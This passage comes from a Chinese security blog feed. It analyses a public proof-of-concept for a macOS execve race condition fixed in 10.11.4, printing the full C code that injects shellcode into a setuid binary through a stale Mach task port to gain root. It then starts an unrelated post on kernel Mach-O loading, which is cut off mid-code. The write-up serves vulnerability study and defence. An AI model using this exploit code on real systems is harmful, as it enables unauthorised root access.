<h1 id="0x03_POC源码分析">0x03 POC源码分析</h1><h2 id="3-1_main">3.1 main</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">kern_return_t</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// register a name with launchd</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">mach_port_t</span> bootstrap_port;</span><br><span class="line">  err = task_get_bootstrap_port(mach_task_self(), &amp;bootstrap_port);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"can't get bootstrap port"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//创建一个具有接受消息权限的port</span></span><br><span class="line">  <span class="keyword">mach_port_t</span> service_port;</span><br><span class="line">  err = mach_port_allocate(mach_task_self(),</span><br><span class="line">                           MACH_PORT_RIGHT_RECEIVE,</span><br><span class="line">                           &amp;service_port);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"can't allocate service port"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//为port添加SEND权限</span></span><br><span class="line">  err = mach_port_insert_right(mach_task_self(),</span><br><span class="line">                               service_port,</span><br><span class="line">                               service_port,</span><br><span class="line">                               MACH_MSG_TYPE_MAKE_SEND);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"can't insert make send right"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// 注册一个全局的Port</span></span><br><span class="line">  <span class="comment">// 之后的子进程会继承这个port</span></span><br><span class="line">  err = bootstrap_register(bootstrap_port, service_name, service_port);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"can't register service port"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"[+] registered service \"%s\" with launchd to receive child thread port\n"</span>, service_name);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fork a child</span></span><br><span class="line">  <span class="keyword">pid_t</span> child_pid = fork();</span><br><span class="line">  <span class="keyword">if</span> (child_pid == <span class="number">0</span>) &#123;</span><br><span class="line">    do_child();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    do_parent(service_port);</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    wait(&amp;status);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>main函数在建立了port之后之后fork出子程序，开始做各自做的事情。</p>
<h2 id="3-2_do_child">3.2 do_child</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_child</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">kern_return_t</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//查找全局的port</span></span><br><span class="line">  <span class="keyword">mach_port_t</span> bootstrap_port;</span><br><span class="line">  err = task_get_bootstrap_port(mach_task_self(), &amp;bootstrap_port);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"child can't get bootstrap port"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">mach_port_t</span> service_port;</span><br><span class="line">  err = bootstrap_look_up(bootstrap_port, service_name, &amp;service_port);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"child can't get service port"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// create a reply port:</span></span><br><span class="line">  <span class="comment">// 创建一个具有接受消息权限的port</span></span><br><span class="line">  <span class="keyword">mach_port_t</span> reply_port;</span><br><span class="line">  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;reply_port);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"child unable to allocate reply port"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// send it our task port</span></span><br><span class="line">  <span class="comment">// 将子进程的port发送给父进程</span></span><br><span class="line">  <span class="keyword">task_msg_send_t</span> msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  msg.header.msgh_size = <span class="keyword">sizeof</span>(msg);</span><br><span class="line">  msg.header.msgh_local_port = reply_port;</span><br><span class="line">  msg.header.msgh_remote_port = service_port;</span><br><span class="line">  msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) | MACH_MSGH_BITS_COMPLEX;</span><br><span class="line"></span><br><span class="line">  msg.body.msgh_descriptor_count = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  msg.port.name = mach_task_self();</span><br><span class="line">  msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;</span><br><span class="line">  msg.port.type = MACH_MSG_PORT_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line">  err = mach_msg_send(&amp;msg.header);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"child unable to send thread port message"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// wait for a reply to ack that the other end got our thread port</span></span><br><span class="line">  <span class="comment">// 等待父进程回复</span></span><br><span class="line">  <span class="keyword">ack_msg_recv_t</span> reply = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  err = mach_msg(&amp;reply.header, MACH_RCV_MSG, <span class="number">0</span>, <span class="keyword">sizeof</span>(reply), reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"child unable to receive ack"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// exec the suid-root binary</span></span><br><span class="line">  <span class="comment">// 执行setuid的程序traceroute6</span></span><br><span class="line">  <span class="keyword">char</span>* argv[] = &#123;suid_binary_path, <span class="string">"-w"</span>, <span class="string">"rofl"</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">  <span class="keyword">char</span>* envp[] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line">  execve(suid_binary_path, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>子进程做的事情也非常的简单，将自己的port发送给父进程，确保父进程已经获取到port之后，执行setuid的程序，poc中使用的是traceroute6。</p>
<h2 id="3-3_do_parent">3.3  do_parent</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_parent</span><span class="params">(mach_port_t service_port)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">kern_return_t</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// generate the page we want to write into the child:</span></span><br><span class="line">  <span class="comment">// 申请一页内存，并且会将这一页内存写入子进程</span></span><br><span class="line">  <span class="keyword">mach_vm_address_t</span> addr = <span class="number">0</span>;</span><br><span class="line">  err = mach_vm_allocate(mach_task_self(),</span><br><span class="line">                         &amp;addr,</span><br><span class="line">                         <span class="number">4096</span>,</span><br><span class="line">                         VM_FLAGS_ANYWHERE);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"failed to mach_vm_allocate memory"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//将0x153c处的写入shellcode</span></span><br><span class="line">  FILE* f = fopen(suid_binary_path, <span class="string">"r"</span>);</span><br><span class="line">  fseek(f, <span class="number">0x1000</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line">  fread((<span class="keyword">char</span>*)addr, <span class="number">0x1000</span>, <span class="number">1</span>, f);</span><br><span class="line">  fclose(f);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(((<span class="keyword">char</span>*)addr)+<span class="number">0x53c</span>, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// wait to get the child's task port on the service port:</span></span><br><span class="line">  <span class="comment">// 等待子进程发送过来的port</span></span><br><span class="line">  <span class="keyword">task_msg_recv_t</span> msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  err = mach_msg(&amp;msg.header,</span><br><span class="line">                 MACH_RCV_MSG,</span><br><span class="line">                 <span class="number">0</span>,</span><br><span class="line">                 <span class="keyword">sizeof</span>(msg),</span><br><span class="line">                 service_port,</span><br><span class="line">                 MACH_MSG_TIMEOUT_NONE,</span><br><span class="line">                 MACH_PORT_NULL);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"error receiving service message"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">mach_port_t</span> target_task_port = msg.port.name;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// before we ack the task port message to signal that the other process should execve the suid</span></span><br><span class="line">  <span class="comment">// binary get the lowest mapped address:</span></span><br><span class="line">  <span class="comment">// 立刻获取内存的信息</span></span><br><span class="line">  <span class="keyword">struct</span> vm_region_basic_info_64 region;</span><br><span class="line">  <span class="keyword">mach_msg_type_number_t</span> region_count = VM_REGION_BASIC_INFO_COUNT_64;</span><br><span class="line">  <span class="keyword">memory_object_name_t</span> object_name = MACH_PORT_NULL; <span class="comment">/* unused */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">mach_vm_size_t</span> target_first_size = <span class="number">0x1000</span>;</span><br><span class="line">  <span class="keyword">mach_vm_address_t</span> original_first_addr = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">  err = mach_vm_region(target_task_port,</span><br><span class="line">                       &amp;original_first_addr,</span><br><span class="line">                       &amp;target_first_size,</span><br><span class="line">                       VM_REGION_BASIC_INFO_64,</span><br><span class="line">                       (<span class="keyword">vm_region_info_t</span>)&amp;region,</span><br><span class="line">                       &amp;region_count,</span><br><span class="line">                       &amp;object_name);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"unable to get first mach_vm_region for target process\n"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"[+] looks like the target processes lowest mapping is at %zx prior to execve\n"</span>, original_first_addr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// send an ack message to the reply port indicating that we have the thread port</span></span><br><span class="line">  <span class="keyword">ack_msg_send_t</span> ack = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">mach_msg_type_name_t</span> reply_port_rights = MACH_MSGH_BITS_REMOTE(msg.header.msgh_bits);</span><br><span class="line"></span><br><span class="line">  ack.header.msgh_bits = MACH_MSGH_BITS(reply_port_rights, <span class="number">0</span>);</span><br><span class="line">  ack.header.msgh_size = <span class="keyword">sizeof</span>(ack);</span><br><span class="line">  ack.header.msgh_local_port = MACH_PORT_NULL;</span><br><span class="line">  ack.header.msgh_remote_port = msg.header.msgh_remote_port;</span><br><span class="line">  ack.header.msgh_bits = MACH_MSGH_BITS(reply_port_rights, <span class="number">0</span>); <span class="comment">// use the same rights we got</span></span><br><span class="line"></span><br><span class="line">  err = mach_msg_send(&amp;ack.header);</span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"parent failed sending ack"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">mach_vm_address_t</span> target_first_addr = <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="comment">// wait until we see that the map has been swapped and the binary is loaded into it:</span></span><br><span class="line">    <span class="comment">// 不断的循环去获取内存的信息</span></span><br><span class="line">    region_count = VM_REGION_BASIC_INFO_COUNT_64;</span><br><span class="line">    object_name = MACH_PORT_NULL; <span class="comment">/* unused */</span></span><br><span class="line">    target_first_size = <span class="number">0x1000</span>;</span><br><span class="line">    target_first_addr = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">    err = mach_vm_region(target_task_port,</span><br><span class="line">                         &amp;target_first_addr,</span><br><span class="line">                         &amp;target_first_size,</span><br><span class="line">                         VM_REGION_BASIC_INFO_64,</span><br><span class="line">                         (<span class="keyword">vm_region_info_t</span>)&amp;region,</span><br><span class="line">                         &amp;region_count,</span><br><span class="line">                         &amp;object_name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (target_first_addr != original_first_addr &amp;&amp; target_first_addr &lt; <span class="number">0x200000000</span>) &#123;</span><br><span class="line">      <span class="comment">// the first address has changed implying that the map was swapped</span></span><br><span class="line">      <span class="comment">// let's try to win the race</span></span><br><span class="line">      <span class="comment">// 当发现获取到的内存信息与之前的不同</span></span><br><span class="line">      <span class="comment">// 说明竞争的窗口打开了</span></span><br><span class="line">      <span class="comment">// 可以尝试去写入shellcode了</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//写入shellcode</span></span><br><span class="line">  <span class="keyword">mach_vm_address_t</span> target_addr = target_first_addr + <span class="number">0x1000</span>;</span><br><span class="line">  <span class="keyword">mach_msg_type_number_t</span> target_size = <span class="number">0x1000</span>;</span><br><span class="line">  mach_vm_protect(target_task_port, target_addr, target_size, <span class="number">0</span>, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);</span><br><span class="line">  mach_vm_write(target_task_port, target_addr, addr, target_size);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hopefully overwrote some code in the target...\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"the target first addr changed to %zx\n"</span>, target_first_addr);</span><br><span class="line">  <span class="comment">//子进程窗口关闭后内存已经被改写，正常执行到entry时，将执行shellcode。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>父进程的行为比较复杂：</p>
<ul>
<li>构建shellcode</li>
<li>获取子进程port</li>
<li>根据子进程的内存信息得到竞争的窗口打开的时机</li>
<li>写入shellcode，等待shellcode执行。</li>
</ul>
<h1 id="0x04_小结">0x04 小结</h1><p>​    通过梳理poc与内核源码后，在了解了<code>execv</code>函数一系列的执行流程，已经内核的一系列内存操作的工具函数之后，这个漏洞其实就是一个简单的逻辑漏洞，通过一个旧的port可以在port被关闭前，任意改写进程的内存地址，当目标进程碰巧是setuid的进程时，就具有了root权限执行任意代码的能力。</p>
<p>​    通过poc的分析，应该学习巩固的知识如下：</p>
<ul>
<li>execv的执行流程</li>
<li>port的使用</li>
<li>mach_vm_* API</li>
</ul>
<p>​    充分理解poc的原理后，可以进一步对这个漏洞的Exploit to get kernel code execution做出更详细的分析，从而反思与总结，如何在开发中预防这种漏洞的产生以及如何通过测试或者代码审计的手段发现类似的漏洞。</p>
<h1 id="参考">参考</h1><ol>
<li>[<a href="https://www.freebsd.org/cgi/man.cgi?query=vnode" target="_blank" rel="external">https://www.freebsd.org/cgi/man.cgi?query=vnode</a></li>
<li><a href="https://www.freebsd.org/cgi/man.cgi?query=namei&amp;apropos=0&amp;sektion=0&amp;manpath=FreeBSD+10.2-RELEASE&amp;arch=default&amp;format=html" target="_blank" rel="external">https://www.freebsd.org/cgi/man.cgi?query=namei&amp;apropos=0&amp;sektion=0&amp;manpath=FreeBSD+10.2-RELEASE&amp;arch=default&amp;format=html</a></li>
<li><a href="http://www.manualpages.de/OpenBSD/OpenBSD-5.0/man9/pmap_create.9.html" target="_blank" rel="external">http://www.manualpages.de/OpenBSD/OpenBSD-5.0/man9/pmap_create.9.html</a></li>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=676&amp;redir=1" target="_blank" rel="external">Logic error when exec-ing suid binaries allows code execution as root on OS X/iOS</a></li>
<li><a href="http://googleprojectzero.blogspot.com/2016/03/race-you-to-kernel.html" target="_blank" rel="external">Race you to the kernel!</a></li>
</ol>
<h1 id="ps">ps</h1><p>这是我的学习分享博客<a href="http://turingh.github.io/">http://turingh.github.io/</a></p>
<p>欢迎大家来探讨，不足之处还请指正。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><blockquote>
<p>灵犀一指可攻可守，进攻时也是一指，是天下第一指法，与移花接玉这个天下第一掌法同样都是非兵刃的第一绝技</p>
<p>—陆小凤传奇</p>
</blockquote>
<p>最近的10.11.4补丁修复了一个利用条件竞争获得代码执行权限的漏洞，经过对内核源码以及poc的理解之后，先对问题作出一个简单的分析。</p>]]>
    
    </summary>
    
      <category term="CVE" scheme="http://turingh.github.io/tags/CVE/"/>
    
      <category term="execv" scheme="http://turingh.github.io/tags/execv/"/>
    
      <category term="ports" scheme="http://turingh.github.io/tags/ports/"/>
    
      <category term="race" scheme="http://turingh.github.io/tags/race/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
      <category term="CVE" scheme="http://turingh.github.io/categories/OS-X/CVE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[OSX内核加载mach-o流程分析]]></title>
    <link href="http://turingh.github.io/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/"/>
    <id>http://turingh.github.io/2016/03/30/OSX内核加载mach-o流程分析/</id>
    <published>2016-03-30T23:58:05.000Z</published>
    <updated>2016-03-31T15:39:14.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>​    研究<code>OS X</code>安全方面的知识需要对<code>mach-o</code>加载的流程需要有一个比较完整的理解，断断续续一个月的时间里面，通过对源码的阅读对<code>mach-o</code>的加载有一个比较基本的认识，在遇到各个具体的问题是才能更好的理解和操作。</p>
<p>​    其他相关文章可以看这里，基本涵盖了从内核态到应用层的相关源码的简单分析。还有不足之处在遇到相关的问题时也会加到这一系列文章中。</p>
<p>​    1.<a href="http://turingh.github.io/2016/03/01/dyld%E4%B8%ADmacho%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">mach-o加载流程学习-dyld对主image的处理流程</a></p>
<p>​    2.<a href="http://turingh.github.io/2016/03/16/dyld%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90load/">mach-o加载流程学习-dyld对依赖库的加载流程</a></p>
<p>​    3.mach-o加载流程学习-内核对mach-o文件的加载流程(本文)</p>
<p>​    </p>
<p>​    通过一张图片，可以比较清楚的理解整个流程。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/f10c5443276635863d7ac7aea6fa2e6db76ce2c3/png/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B.png" alt="整体流程"></p>
<a id="more"></a>
<h1 id="0x01_源码分析">0x01 源码分析</h1><h2 id="1-1___mac_execve">1.1 __mac_execve</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">__mac_execve(<span class="keyword">proc_t</span> p, <span class="keyword">struct</span> __mac_execve_args *uap, <span class="keyword">int32_t</span> *retval)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">char</span> *bufp = <span class="literal">NULL</span>; </span><br><span class="line">	<span class="keyword">struct</span> image_params *imgp;</span><br><span class="line">	<span class="keyword">struct</span> vnode_attr *vap;</span><br><span class="line">	<span class="keyword">struct</span> vnode_attr *origvap;</span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line">	<span class="keyword">int</span> is_64 = IS_64BIT_PROCESS(p);</span><br><span class="line">	<span class="keyword">struct</span> vfs_context context;</span><br><span class="line">	<span class="keyword">struct</span> uthread	*uthread;</span><br><span class="line">	</span><br><span class="line">  	<span class="comment">//初始化context</span></span><br><span class="line">	context.vc_thread = current_thread();</span><br><span class="line">	context.vc_ucred = kauth_cred_proc_ref(p);	<span class="comment">/* <span class="label">XXX must NOT be kauth_cred_get() */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Allocate a big chunk for locals instead of using stack since these  </span><br><span class="line">	 * structures a pretty big.</span><br><span class="line">	 */</span></span><br><span class="line">  	//申请一块连续的大内存，用来存放imgp，vap，origvap的数据结构</span><br><span class="line">	MALLOC(bufp, char *, (sizeof(*imgp) + sizeof(*vap) + sizeof(*origvap)), M_TEMP, M_WAITOK | M_ZERO);</span><br><span class="line">	imgp = (struct image_params *) bufp;</span><br><span class="line">	if (bufp == NULL) &#123;</span><br><span class="line">		error = ENOMEM</span><br><span class="line">		goto 